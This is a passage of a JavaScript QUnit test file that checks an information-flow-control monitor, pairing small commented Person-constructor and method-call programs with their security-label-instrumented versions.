            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'age'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'age', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('age', _lab), _pc));
         this_aux['age'] = age;
      };
      _val_10._lab = _lab;
      _val_10._pc = _pc;
      _val_10._instrumented = true;
      _lev_10 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('Person', _lab));
      _runtime.setVarLev('Person', _lev_10, _lab);
      Person = _val_10;
      if (Person._instrumented) {
         _lev_9 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _val_9 = _runtime.initObject(Person.prototype, _lev_9);
         _aux_1 = _runtime.call(_val_9, Person, 1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _lev_9);
         if (_aux_1) {
            _lev_9 = _aux_1._val;
            _val_9 = _aux_1._lev;
         }
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _enforceInstr = _runtime.getEnforceConstructor(Person);
         _computeRetLevel = _runtime.getNewObjLevel(Person);
         _updtArgsLevels = _runtime.getUpdtArgsLevelsConstructor(Person);
         _enforceInstr(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _val_9 = new Person(1, 'Raquel', 22);
         _lev_9 = _computeRetLevel(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_9);
         _updtArgsLevels(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_9);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('p', _lab));
      _runtime.setVarLev('p', _lev_9, _lab);
      p = _val_9;
   }
   
    test('new - 1', function() {
      var res;
      try {
         res = test11();
         ok(true);
      } catch (e) {
         console.log('Test11: ' + e.message);
         ok(false);
      }
   });
   
 
   /*
    *   	var Person, p1, low; 
    *    Person = function(id, name, age) {
    *       var this_aux; 
    *       this_aux = this; 
    *       this_aux['id'] = id;
    *       this_aux['name'] = name; 
    *       this_aux['age'] = age;  
    *       upgProp(this_aux, 'id', '2'); 
    *    }
    *    p1 = new Person(1, 'Raquel', 22); 
    *    low = p1['id'];
    */  

   function test12() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_9, _lev_9, _val_8, _lev_8, _val_7, _lev_7;
      var Person, p1, low;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['Person', 'p1', 'low'], _pc);
      _val_9 = function(id, name, age, args_levels, _pc) {
         var _lab, _aux_1, _aux_2, _aux_3;
         var this_aux;
         _pc = _runtime.lat.lub(_pc, arguments.callee._pc);
         _lab = _runtime.initLab(arguments.callee._lab, ['id', 'name', 'age'], args_levels, ['this_aux'], _pc);
         _runtime.enforce(_pc, _runtime.getVarLev('this_aux', _lab));
         _runtime.setVarLev('this_aux', _runtime.lat.lub(_runtime.getVarLev('this', _lab), _pc), _lab);
         this_aux = this;
         _runtime.isValidPropertyAccess(this_aux, 'id');
         if (_runtime.internalHasOwnProperty(this_aux, 'id')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'id'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'id', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('id', _lab), _pc));
         this_aux['id'] = id;
         _runtime.isValidPropertyAccess(this_aux, 'name');
         if (_runtime.internalHasOwnProperty(this_aux, 'name')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'name'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'name', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('name', _lab), _pc));
         this_aux['name'] = name;
         _runtime.isValidPropertyAccess(this_aux, 'age');
         if (_runtime.internalHasOwnProperty(this_aux, 'age')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'age'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'age', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('age', _lab), _pc));
         this_aux['age'] = age;
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _pc), _runtime.getPropLev(this_aux, 'id'));
         _runtime.setPropLev(this_aux, 'id', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), '2', _runtime.getPropLev(this_aux, 'id')));
      };
      _val_9._lab = _lab;
      _val_9._pc = _pc;
      _val_9._instrumented = true;
      _lev_9 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('Person', _lab));
      _runtime.setVarLev('Person', _lev_9, _lab);
      Person = _val_9;
      if (Person._instrumented) {
         _lev_8 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _val_8 = _runtime.initObject(Person.prototype, _lev_8);
         _aux_1 = _runtime.call(_val_8, Person, 1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _lev_8);
         if (_aux_1) {
            _lev_8 = _aux_1._val;
            _val_8 = _aux_1._lev;
         }
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _enforceInstr = _runtime.getEnforceConstructor(Person);
         _computeRetLevel = _runtime.getNewObjLevel(Person);
         _updtArgsLevels = _runtime.getUpdtArgsLevelsConstructor(Person);
         _enforceInstr(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _val_8 = new Person(1, 'Raquel', 22);
         _lev_8 = _computeRetLevel(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_8);
         _updtArgsLevels(1, 'Raquel', 22, [_runtime.lat.bot, _runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_8);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('p1', _lab));
      _runtime.setVarLev('p1', _lev_8, _lab);
      p1 = _val_8;
      _runtime.isValidPropertyAccess(p1, 'id');
      _val_7 = p1['id'];
      _lev_7 = _runtime.lat.lub(_runtime.getVarLev('p1', _lab), _runtime.lat.bot, _runtime.getPropLev(p1, 'id'));
      _runtime.enforce(_pc, _runtime.getVarLev('low', _lab));
      _runtime.setVarLev('low', _lev_7, _lab);
      low = _val_7;
   }

    test('new - 2', function() {
      var res;
      try {
         res = test12();
         ok(true);
      } catch (e) {
         console.log('Test12: ' + e.message);
         ok(false);
      }
   });
   
   
   /*
    * var Person, person_proto, function_aux, new_person, high; 
    * Person = function(name, id) {
    *  var this_aux; 
    *  this_aux = this; 
    *  this_aux['name'] = name; 
    *  this_aux['id'] = id; 
    *  upgProp(this_aux, 'id', '2');
    * } 
    * person_proto = Person['prototype']; 
    * function_aux = function() {
    *  var aux_var_1; 
    *  aux_var_1 = this; 
    *  aux_var_1 = aux_var_1['id']; 
    *  return aux_var_1; 
    * }
    * person_proto['sayYourId'] = function_aux;
    * new_person = new Person('raquel', 1); 
    * high = new_person['sayYourId'](); 
    */ 

   function test13() {
      var _lab, _pc, _aux_1, _aux_2, _aux_3, _val_7, _lev_7, _val_6, _lev_6, _val_5, _lev_5, _val_3, _lev_3, _val_2, _lev_2;
      var Person, person_proto, function_aux, new_person, high;
      _pc = _runtime.lat.bot;
      _lab = _runtime.initLab(['Person', 'person_proto', 'function_aux', 'new_person', 'high'], _pc);
      _val_7 = function(name, id, args_levels, _pc) {
         var _lab, _aux_1, _aux_2, _aux_3;
         var this_aux;
         _pc = _runtime.lat.lub(_pc, arguments.callee._pc);
         _lab = _runtime.initLab(arguments.callee._lab, ['name', 'id'], args_levels, ['this_aux'], _pc);
         _runtime.enforce(_pc, _runtime.getVarLev('this_aux', _lab));
         _runtime.setVarLev('this_aux', _runtime.lat.lub(_runtime.getVarLev('this', _lab), _pc), _lab);
         this_aux = this;
         _runtime.isValidPropertyAccess(this_aux, 'name');
         if (_runtime.internalHasOwnProperty(this_aux, 'name')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'name'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'name', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('name', _lab), _pc));
         this_aux['name'] = name;
         _runtime.isValidPropertyAccess(this_aux, 'id');
         if (_runtime.internalHasOwnProperty(this_aux, 'id')) {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(this_aux, 'id'));
         } else {
            _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(this_aux));
         }
         _runtime.setPropLev(this_aux, 'id', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _runtime.lat.bot, _runtime.getVarLev('id', _lab), _pc));
         this_aux['id'] = id;
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), _pc), _runtime.getPropLev(this_aux, 'id'));
         _runtime.setPropLev(this_aux, 'id', _runtime.lat.lub(_runtime.getVarLev('this_aux', _lab), '2', _runtime.getPropLev(this_aux, 'id')));
      };
      _val_7._lab = _lab;
      _val_7._pc = _pc;
      _val_7._instrumented = true;
      _lev_7 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('Person', _lab));
      _runtime.setVarLev('Person', _lev_7, _lab);
      Person = _val_7;
      _runtime.isValidPropertyAccess(Person, 'prototype');
      _val_6 = Person['prototype'];
      _lev_6 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _runtime.lat.bot, _runtime.getPropLev(Person, 'prototype'));
      _runtime.enforce(_pc, _runtime.getVarLev('person_proto', _lab));
      _runtime.setVarLev('person_proto', _lev_6, _lab);
      person_proto = _val_6;
      _val_5 = function(args_levels, _pc) {
         var _lab, _aux_1, _aux_2, _aux_3, _val_4, _lev_4;
         var aux_var_1;
         _pc = _runtime.lat.lub(_pc, arguments.callee._pc);
         _lab = _runtime.initLab(arguments.callee._lab, [], args_levels, ['aux_var_1'], _pc);
         _runtime.enforce(_pc, _runtime.getVarLev('aux_var_1', _lab));
         _runtime.setVarLev('aux_var_1', _runtime.lat.lub(_runtime.getVarLev('this', _lab), _pc), _lab);
         aux_var_1 = this;
         _runtime.isValidPropertyAccess(aux_var_1, 'id');
         _val_4 = aux_var_1['id'];
         _lev_4 = _runtime.lat.lub(_runtime.getVarLev('aux_var_1', _lab), _runtime.lat.bot, _runtime.getPropLev(aux_var_1, 'id'));
         _runtime.enforce(_pc, _runtime.getVarLev('aux_var_1', _lab));
         _runtime.setVarLev('aux_var_1', _lev_4, _lab);
         aux_var_1 = _val_4;
         return {
            _val : aux_var_1,
            _lev : _runtime.lat.lub(_runtime.getVarLev('aux_var_1', _lab), _pc)
         };
      };
      _val_5._lab = _lab;
      _val_5._pc = _pc;
      _val_5._instrumented = true;
      _lev_5 = _pc;
      _runtime.enforce(_pc, _runtime.getVarLev('function_aux', _lab));
      _runtime.setVarLev('function_aux', _lev_5, _lab);
      function_aux = _val_5;
      _runtime.isValidPropertyAccess(person_proto, 'sayYourId');
      if (_runtime.internalHasOwnProperty(person_proto, 'sayYourId')) {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('person_proto', _lab), _runtime.lat.bot, _pc), _runtime.getPropLev(person_proto, 'sayYourId'));
      } else {
         _runtime.enforce(_runtime.lat.lub(_runtime.getVarLev('person_proto', _lab), _runtime.lat.bot, _pc), _runtime.getStructLev(person_proto));
      }
      _runtime.setPropLev(person_proto, 'sayYourId', _runtime.lat.lub(_runtime.getVarLev('person_proto', _lab), _runtime.lat.bot, _runtime.getVarLev('function_aux', _lab), _pc));
      person_proto['sayYourId'] = function_aux;
      if (Person._instrumented) {
         _lev_3 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _val_3 = _runtime.initObject(Person.prototype, _lev_3);
         _aux_1 = _runtime.call(_val_3, Person, 'raquel', 1, [_runtime.lat.bot, _runtime.lat.bot], _lev_3);
         if (_aux_1) {
            _lev_3 = _aux_1._val;
            _val_3 = _aux_1._lev;
         }
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('Person', _lab), _pc);
         _enforceInstr = _runtime.getEnforceConstructor(Person);
         _computeRetLevel = _runtime.getNewObjLevel(Person);
         _updtArgsLevels = _runtime.getUpdtArgsLevelsConstructor(Person);
         _enforceInstr('raquel', 1, [_runtime.lat.bot, _runtime.lat.bot], _aux_1);
         _val_3 = new Person('raquel', 1);
         _lev_3 = _computeRetLevel('raquel', 1, [_runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_3);
         _updtArgsLevels('raquel', 1, [_runtime.lat.bot, _runtime.lat.bot], _aux_1, _val_3);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('new_person', _lab));
      _runtime.setVarLev('new_person', _lev_3, _lab);
      new_person = _val_3;
      _runtime.isValidPropertyAccess(new_person, 'sayYourId');
      if (new_person['sayYourId']['_instrumented']) {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('new_person', _lab), _runtime.lat.bot, _runtime.getPropLev(new_person, 'sayYourId'), _pc);
         _aux_1 = new_person['sayYourId']([], _aux_1);
         _val_2 = _aux_1._val;
         _lev_2 = _aux_1._lev;
      } else {
         _aux_1 = _runtime.lat.lub(_runtime.getVarLev('new_person', _lab), _runtime.lat.bot, _runtime.getPropLev(new_person, 'sayYourId'), _pc);
         _enforceInstr = _runtime.getEnforceMethod(new_person, 'sayYourId');
         _computeReturnLevel = _runtime.getComputeRetLevelMethod(new_person, 'sayYourId');
         _updateArgsLevels = _runtime.getUpdtArgsLevelsMethod(new_person, 'sayYourId');
         _processRetValue = _runtime.getProcessRetValue(new_person, 'sayYourId');
         _enforceInstr(new_person, [_runtime.getVarLev('new_person', _lab)], _aux_1);
         _val_2 = new_person['sayYourId']();
         _val_2 = _processRetValue(new_person, [_runtime.getVarLev('new_person', _lab)], _aux_1, _val_2);
         _lev_2 = _computeRetLevel(new_person, [_runtime.getVarLev('new_person', _lab)], _aux_1);
         _updtArgsLevels(new_person, [_runtime.getVarLev('new_person', _lab)], _aux_1);
      }
      _runtime.enforce(_pc, _runtime.getVarLev('high', _lab));
      _runtime.setVarLev('high', _lev_2, _lab);
      high = _val_2;
   }

   test('method call - 1', function() {
      var res;
      try {
         res = test13();
         ok(true);
      } catch (e) {
         console.log('Test13: ' + e.message);
         ok(false);
      }
   }); 

}); 
